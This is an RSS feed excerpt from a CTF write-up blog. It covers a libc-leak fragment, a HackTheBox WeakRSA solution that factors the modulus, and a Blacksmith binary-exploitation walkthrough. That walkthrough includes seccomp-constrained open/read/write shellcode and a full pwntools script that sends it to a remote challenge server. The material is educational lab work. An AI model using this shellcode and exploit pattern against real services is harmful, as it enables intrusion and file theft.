alarm @ 0x7ff2d7cea5b0
close @ 0x0
read @ 0x7ff2d7d14980
srand @ 0x7ff2d7c460a0
time @ 0x7ffdaafcfc60
fflush @ 0x7ff2d7c7f1b0
setvbuf @ 0x7ff2d7c81670
open @ 0x7ff2d7d14690
__isoc99_scanf @ 0x7ff2d7c62110
rand @ 0x7ff2d7c46760</code></pre><p>When I enter those symbols and addresses into a libc-leak website like <a href="https://libc.rip/">libc.rip</a>, I cannot find a single libc version. That means that there&apos;s a custom libc version, which means we can&apos;t call <code>system()</code> since we don&apos;t have the address.</p>]]></content:encoded></item><item><title><![CDATA[WeakRSA (HackTheBox)]]></title><description><![CDATA[<p>G&apos;day everyone! In this write-up we are going to solve the retired WeakRSA challenge on Hack The Box. In order to do so however it is important you understand some of the basics. You will learn </p><ul><li>Basic RSA</li><li>Decoding pem formats</li></ul><h2 id="how-does-rsa-work">How does RSA work?</h2><p>RSA is an</p>]]></description><link>https://pwning.tech/weakrsa/</link><guid isPermaLink="false">658f44f8d32e980001de21eb</guid><category><![CDATA[HackTheBox challenges]]></category><category><![CDATA[Cryptography]]></category><dc:creator><![CDATA[statusquo]]></dc:creator><pubDate>Thu, 24 Nov 2022 21:27:26 GMT</pubDate><content:encoded><![CDATA[<p>G&apos;day everyone! In this write-up we are going to solve the retired WeakRSA challenge on Hack The Box. In order to do so however it is important you understand some of the basics. You will learn </p><ul><li>Basic RSA</li><li>Decoding pem formats</li></ul><h2 id="how-does-rsa-work">How does RSA work?</h2><p>RSA is an encryption algorithm which has been around since 1977. To use it you will need to chose two different large prime numbers these will be named p and q. </p><p>By multiplying p and q together you get your modulus named N. Then you can choose your exponent which we will name e. &#xA0;Now you are ready to encrypt your secret message. Using RSA our encryped message will be calculated like this : (message^e) mod N</p><p>In python3 it can be computed like this : </p><blockquote>pow(message,e,N)</blockquote><h2 id="decrypting-rsa">Decrypting RSA</h2><p>Decrypting will be a little bit harder. To do so we first must find phi &#x3C6;(N). We can do so like this : &#x3C6;(N) = &#xA0;(p-1) * (q-1). </p><p>Remember that we need to know p and q to decrypt this is important. We are finally ready to calculate d, the modular inverse of e. This can be done by using the extended euclidean algorithm. You don&apos;t have to understand how (or why) it works but saying it will make you look smart. In python I use xgcd from the libnum library. d will be the first value the algorithm outputs.</p><blockquote>d = xgcd(e,&#x3C6;N) [0]</blockquote><p>&#x2003;The plaintext can then be calculated :</p><p>plaintext = pow(encrypted, d, N)</p><h2 id="solving-the-challenge">Solving the challenge</h2><p>After downloading and extracting the zip we get a key encoded in the pub format. We can decode it using python or just by using an <a href="https://8gwifi.org/PemParserFunctions.jsp">online tool</a> which gives us the following data : </p><figure class="kg-card kg-image-card"><img src="https://pwning.tech/content/images/2022/11/image-1.png" class="kg-image" alt loading="lazy" width="759" height="265" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-1.png 600w, https://pwning.tech/content/images/2022/11/image-1.png 759w" sizes="(min-width: 720px) 720px"></figure><p>The Modulus being the public key N and the public exponent is our e</p><p>We know that the modulus is just p * q but it will take forever to factor such a large number. If only there was a quicker method. Wait a minute what if there are databases containing the factors of large number... That would be really helpful. After some searching I encountered <a href="http://factordb.com/">this site</a>. Let&apos;s try to input our N :</p><figure class="kg-card kg-image-card"><img src="https://pwning.tech/content/images/2022/11/image-2.png" class="kg-image" alt loading="lazy" width="1452" height="330" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-2.png 600w, https://pwning.tech/content/images/size/w1000/2022/11/image-2.png 1000w, https://pwning.tech/content/images/2022/11/image-2.png 1452w" sizes="(min-width: 720px) 720px"></figure><p>Looks like we found p and q. From here we can get the flag using python : </p><figure class="kg-card kg-image-card"><img src="https://pwning.tech/content/images/2022/11/image-4.png" class="kg-image" alt loading="lazy" width="760" height="654" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-4.png 600w, https://pwning.tech/content/images/2022/11/image-4.png 760w" sizes="(min-width: 720px) 720px"></figure>
        <div class="kg-card kg-file-card kg-file-card-medium">
            <a class="kg-file-card-container" href="https://pwning.tech/content/files/2022/11/solve.py" title="Download" download>
                <div class="kg-file-card-contents">
                    <div class="kg-file-card-title">Solve</div>
                    
                    <div class="kg-file-card-metadata">
                        <div class="kg-file-card-filename">solve.py</div>
                        <div class="kg-file-card-filesize">932 Bytes</div>
                    </div>
                </div>
                <div class="kg-file-card-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><defs><style>.a{fill:none;stroke:currentColor;stroke-linecap:round;stroke-linejoin:round;stroke-width:1.5px;}</style></defs><title>download-circle</title><polyline class="a" points="8.25 14.25 12 18 15.75 14.25"/><line class="a" x1="12" y1="6.75" x2="12" y2="18"/><circle class="a" cx="12" cy="12" r="11.25"/></svg>
                </div>
            </a>
        </div>
        <p>The script should output the flag : </p><blockquote><em>HTB{s1mpl3_Wi3n3rs_4tt4ck}</em></blockquote><p>The lesson this challenge is trying to teach us is that p and q should be above 512 digits. This way the public key is less likely to be factorized, so p and q cant be found and your secret messages wont be able to be decrypted.</p>]]></content:encoded></item><item><title><![CDATA[Blacksmith (HackTheBox)]]></title><description><![CDATA[<p>Hey all. Today we&apos;re going to discuss the retired <a href="https://app.hackthebox.com/challenges/blacksmith">Blacksmith</a> challenge on HackTheBox. The description on HackTheBox is as follows:</p><blockquote>You are the only one who is capable of saving this town and bringing peace upon this land! You found a blacksmith who can create the most powerful</blockquote>]]></description><link>https://pwning.tech/blacksmith/</link><guid isPermaLink="false">658f44f8d32e980001de21e8</guid><category><![CDATA[HackTheBox challenges]]></category><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[HackTheBoo]]></category><category><![CDATA[Seccomp]]></category><category><![CDATA[x64 Assembly]]></category><category><![CDATA[Linux Syscalls]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Sun, 20 Nov 2022 12:00:00 GMT</pubDate><content:encoded><![CDATA[<p>Hey all. Today we&apos;re going to discuss the retired <a href="https://app.hackthebox.com/challenges/blacksmith">Blacksmith</a> challenge on HackTheBox. The description on HackTheBox is as follows:</p><blockquote>You are the only one who is capable of saving this town and bringing peace upon this land! You found a blacksmith who can create the most powerful weapon in the world! You can find him under the label &quot;./flag.txt&quot;.</blockquote><p>In this write-up, we will learn about <strong>seccomp</strong>, <strong>writing assembly</strong>, and performing <strong>syscalls</strong>. </p><h1 id="summary">Summary</h1><ul><li>First looks</li><li>Finding vulnerability primitives</li><li>Developing AMD64 (x86_64) assembly</li><li>Retrieving the flag</li></ul><h1 id="first-looks">First looks</h1><p>We are given the <code>blacksmith</code> executable binary. Upon running the binary, we are presented with a menu to trade items:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">$ ./blacksmith
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
&gt; 1
What do you want me to craft?
1. sword
2. shield
3. bow
&gt; 3
This bow&apos;s range is the best!
Too bad you do not have enough materials to craft some arrows too..</code></pre><figcaption>The program output</figcaption></figure><p>Usually, I start by checking the binary&apos;s security using pwntools&apos; <code>checksec</code>. In this case, the security of <code>blacksmith</code> binary is:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">$ checksec blacksmith
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments</code></pre><figcaption>The checksec output</figcaption></figure><p>The fields in checksec mean the following:</p><ul><li>Arch: the CPU architecture and instruction set (x86, ARM, MIPS, ...)</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/relro">RELRO</a>: Relocation Read-Only - secures the <a href="https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite">dynamic linking process</a></li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/canaries">Stack Canaries</a>: protects against stack buffer overflow attacks</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/no-execute">NX</a>: No eXecute - write-able memory cannot be executed</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/pie">PIE</a>: Position Independable Executable - address randomization </li><li>RWX: Read Write Execute - there&apos;s memory that&apos;s RWX</li></ul><p>The logical conclusion is that we need to write a shellcode to the RWX memory to read out <code>flag.txt</code> (based on the challenge description).</p><h1 id="finding-vulnerability-primitives">Finding vulnerability primitives</h1><p>To start, a vulnerability primitive is a building block of an exploit. A primitive can be bundled with other primitives to achieve a higher impact, like teamwork. An <strong>example</strong> of primitives working together is as follows: </p><ul><li>an information leak primitive to leak an address</li><li>an arbitrary write primitive to control the execution flow</li></ul><p>... which can work together by <strong>controlling the execution flow</strong> by <strong>writing</strong> a <strong><strong>leaked</strong> address.</strong></p><h3 id="main-analysis">Main analysis</h3><p>When I want to find vulnerability primitives, I open the binary in <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>, Ghidra is a reverse engineering tool developed by the NSA (yes, <em>that</em> NSA). I start off analyzing a binary at the <code>main</code> function. In this case, it looked like the following:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void main(void)
{
  size_t __n;
  long in_FS_OFFSET;
  int i_has_things;
  int i_option;
  char *local_20;
  char *local_18;
  long __can_token;
  
  __can_token = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  // ...
  __isoc99_scanf(&quot;%d&quot;,&amp;i_has_things);
  if (i_has_things != 1) {
    puts(&quot;Farewell traveler! Come back when you have all the materials!&quot;);
    exit(34);
  }
  printf(s_What_do_you_want_me_to_craft?_1._001012e0);
  __isoc99_scanf(&quot;%d&quot;,&amp;i_option);
  sec();
  if (i_option == 2) {
    shield();
  } else if (i_option == 3) {
    bow();
  } else if (i_option == 1) {
    sword();
  } else {
    write(STDOUT_FILENO,local_18,strlen(local_18));
    exit(261);
  }
  if (__can_token != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}</code></pre><figcaption>Decompilation of the main function</figcaption></figure><p>So, the <code>main</code> function does the following:</p><ol><li>setup()</li><li>sec()</li><li>shield(), bow() <strong>or</strong> sword()</li></ol><p>In addition to that, the main function uses canary tokens in variable <code>__can_token</code>. As you can see, if <code>__can_token</code> is not equal to the original value, it means that stack corruption has been detected and hence, <code>__stack_chk_fail</code> is called which exits the program.</p><p>The function <code>setup</code> removes the buffer for stdout and stdin, which is standard and hence not interesting. In contrast, the <code>sec</code> function is interesting.</p><h3 id="sec-function">Sec function</h3><figure class="kg-card kg-code-card"><pre><code class="language-c">void sec(void)

{
  void* ctx;
  long in_FS_OFFSET;
  long __can_token;
  
  __can_token = *(long *)(in_FS_OFFSET + 0x28);
  // ...
                    // allow sys_read, sys_write, 
                    // sys_open, sys_exit
  ctx = seccomp_init(0);
  seccomp_rule_add(ctx,0x7fff0000,2,0);
  seccomp_rule_add(ctx,0x7fff0000,0,0);
  seccomp_rule_add(ctx,0x7fff0000,1,0);
  seccomp_rule_add(ctx,0x7fff0000,60,0);
  seccomp_load(ctx);
  if (__can_token != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}</code></pre><figcaption>The sec function</figcaption></figure><p>We can see that the <code>sec</code> function primarily creates an allow list using <a href="https://en.wikipedia.org/wiki/Seccomp"><strong><code>seccomp</code></strong></a> of the syscalls <code>sys_read</code>, <code>sys_write</code>, <code>sys_open</code>, and <code>sys_exit</code>. (Note that the naming convention for internal syscall functions is a <code>sys_</code> prefix. When we say <code>sys_read</code>, we mean the syscall <code>read</code>.) By doing this, the developer of the program prevents us from executing our shell on the server since we would need to <code>sys_execve(&quot;/bin/sh&quot;, NULL, NULL)</code> for that. Because <code>sys_execve</code> is not on the allow list, we cannot use it. <strong>Remember this for later.</strong></p><h3 id="shield-analysis">Shield analysis</h3><p>Furthermore, we have the <code>shield()</code>, <code>bow()</code> <strong>or</strong> <code>sword()</code> calls in <code>main()</code>. The <code>bow()</code> and <code>sword()</code> functions crash the program before a user can give input, which means that&apos;s irrelevant. So basically, the vulnerability <strong>must be</strong> in <code>shield()</code>. &#xA0;</p><figure class="kg-card kg-code-card"><pre><code class="language-C">void shield(void)

{
  size_t strlen;
  long in_FS_OFFSET;
  char buf[72];
  long __can_token;
  
  __can_token = *(long *)(in_FS_OFFSET + 0x28);
  strlen = ::strlen(s_Excellent_choice!_This_luminous_s_00101080);
  write(1,s_Excellent_choice!_This_luminous_s_00101080,strlen);
  strlen = ::strlen(&quot;Do you like your new weapon?\n&gt; &quot;);
  write(1,&quot;Do you like your new weapon?\n&gt; &quot;,strlen);
  read(0,buf,63);
  (*(code *)buf)();
  if (__can_token != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}</code></pre><figcaption>The shield function</figcaption></figure><p>What sticks out to me in this function is that we have user input and are calling a variable like a function using <code>(*(code *)buf)();</code>. The code <code>(*(code *)buf)();</code> is equivalent to the ASM below: </p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">00100dd9 48 8d 55     LEA       RDX, [RBP - 0x50]   ; code* RDX = &amp;buf
         b0
00100ddd b8 00 00     MOV       RAX, 0x0
         00 00
00100de2 ff d2        CALL      RDX                 ; RDX()</code></pre><figcaption>ASM version of <code>(*(code *)buf)();</code></figcaption></figure><p>The &#xA0;<code>(*(code *)buf)();</code> function call executes the <code>buf</code> variable on the stack as if it was assembly. This means we can inject assembly into the program. </p><h1 id="developing-amd64-x6486-assembly">Developing AMD64 (x64_86) assembly</h1><p>We have an arbitrary execution primitive so we need to write an assembly payload. The difficulty with this is that:</p><ul><li>We have <code>63</code> bytes to work with:</li></ul><figure class="kg-card kg-code-card"><pre><code class="language-c">  // shield() function
  read(STDIN_FILENO,buf,63);
  (*(code *)buf)();</code></pre><figcaption>Part of the shield() function</figcaption></figure><ul><li>We can only use <code>sys_read</code>, <code>sys_write</code>, <code>sys_open</code> and <code>sys_exit</code>:</li></ul><figure class="kg-card kg-code-card"><pre><code class="language-c">  // sec() function
  // allow sys_read, sys_write, 
  // sys_open, sys_exit
  ctx = seccomp_init(0);
  seccomp_rule_add(ctx,0x7fff0000,2,0);
  seccomp_rule_add(ctx,0x7fff0000,0,0);
  seccomp_rule_add(ctx,0x7fff0000,1,0);
  seccomp_rule_add(ctx,0x7fff0000,60,0);
  seccomp_load(ctx);</code></pre><figcaption>Part of the sec() function</figcaption></figure><ul><li>We do not have a stack address (ASLR)</li></ul><p>However, the challenge description told us that we need to read the <code>flag.txt</code> file. Hence, the strategy for this payload is opening <code>flag.txt</code>, reading <code>flag.txt</code> into a buffer, and writing the buffer to <code>stdout</code>. </p><p>To interact with those files, we need to utilize system calls (&quot;syscalls&quot;). Syscalls are essentially an ABI (binary API) with the Linux kernel which is like the god of the operating system. The kernel provides memory management, CPU scheduling, driver management, hardware IO, et cetera. If you want to learn more about the kernel, the book &quot;<a href="https://www.amazon.com/Linux-Kernel-Development-Robert-Love/dp/0672329468">Linux Kernel Development</a>&quot; by Robert Love is an excellent way to learn more about the kernel (I&apos;ve read it).</p><p>I used a <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux x64 syscall table</a> as a reference for using the syscalls. Essentially the code should do the following:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">// sys_open(char* filename, int flags, int mode)
int fd = sys_open(&quot;flag.txt&quot;, 0, 0);  

// sys_read(int fd, char* buf, size_t count)
int written = sys_read(fd, buf, 0x9999);

// sys_write(int fd, char* buf, size_t count)
sys_write(1, buf, written);</code></pre><figcaption>C pseudocode of the ASM payload</figcaption></figure><p>I came up with the following ASM:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">mov rax, 2
lea rdi, [rip+41]  ; flag.txt will be at the end of the payload
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rdi
mov rdi, rax
xor rax, rax
mov rdx, 30
syscall

mov rdx, rax
mov rax, 1
mov rdi, rax
syscall</code></pre><figcaption>Payload used to leak flag.txt</figcaption></figure><p>Since we have only 63 bytes to work with, I had to be creative. In assembly, most bytes are allocated to constant values like <code>mov rax, 2</code> since it will store an 8-byte <code>0x00000000 00000002</code> into the instruction. That means we can <strong>save a <em>lot</em> of bytes</strong> by reusing register values. </p><p>I eventually refactored the payload into 46 bytes:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">push r10
inc r10
mov rax, r10
lea rdi, [rip+31]  ; flag.txt will be at the end of the payload
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rdi
mov rdi, rax
xor rax, rax
mov rdx, r11
syscall

mov rdx, rax
pop rax
mov rdi, rax
syscall</code></pre><figcaption>The final compressed ASM payload</figcaption></figure><h1 id="retrieving-the-flag">Retrieving the flag</h1><p>Now we have a steady payload, we need to send it to the application. I made the following script using pwntools:</p><figure class="kg-card kg-code-card"><pre><code class="language-python">#!/usr/bin/python3

from pwn import remote, gdb, ELF, asm, context
import time

e = ELF(&apos;blacksmith&apos;)

is_remote = True
if is_remote:
    p = remote(&quot;64.227.36.64&quot;, 32615)
else:
    p = e.process()

context.binary = e.path  # set the pwntools context for asm()

p.sendlineafter(b&quot;all!\n&gt; &quot;, b&apos;1&apos;)
p.sendlineafter(b&quot;\xf0\x9f\x8f\xb9\n&gt; &quot;, b&apos;2&apos;)  # get to shield()

payload = asm(f&apos;&apos;&apos;push r10
inc r10
mov rax, r10
lea rdi, [rip+31]
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rdi
mov rdi, rax
xor rax, rax
mov rdx, r11
syscall

mov rdx, rax
pop rax
mov rdi, rax
syscall&apos;&apos;&apos;)

print(f&quot;writing ASM with {len(payload)} bytes&quot;)

# payload = payload + filler + filename
payload += b&quot;flag.txt&quot;
print(f&quot;writing ASM+filename with {len(payload)} bytes&quot;)

p.sendafter(b&quot;weapon?\n&gt; &quot;, payload)
while True:
    print(p.recvline())
</code></pre><figcaption>The final script used for sending the payload to the application</figcaption></figure>]]></content:encoded></item></channel></rss>